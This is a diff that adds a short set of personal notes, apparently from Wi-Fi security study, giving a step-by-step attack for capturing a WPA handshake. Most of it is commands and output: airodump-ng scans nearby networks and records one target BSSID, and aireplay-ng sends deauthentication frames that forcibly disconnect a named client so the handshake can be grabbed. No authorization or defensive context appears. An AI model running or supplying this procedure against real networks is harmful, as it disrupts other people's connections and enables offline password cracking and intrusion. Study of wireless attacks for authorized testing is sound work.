@@ -1,0 +1,20 @@
+To capture hanshake 
+
+step 1 -> Check all the networks present in the surrounding 
+
+->airodump-ng wlan0
+
+step 2 -> I want to capture a handshake so i am creating a file wpa_handshake which will capture the hanshake when ever someone new will try to join the network 
+
+-> airodump-ng --bssid 0C:0E:76:4C:BC:48 --channel 3 --write wpa_handshake wlan0
+
+Step 3 -> we can't wait so much so i will simply disconnet any device from the network 
+
+-> aireplay-ng --deauth 10 -a 0C:0E:76:4C:BC:48 -c 46:91:75:8B:86:B3 wlan0 
+ 
+Step 4 -> the device will be disconnected and when it connects again we will get the handshake 
+
+it will show like this 
+
+CH  3 ][ Elapsed: 3 mins ][ 2023-07-28 23:45 ][ WPA handshake: 0C:0E:76:4C:BC:48 
+ 
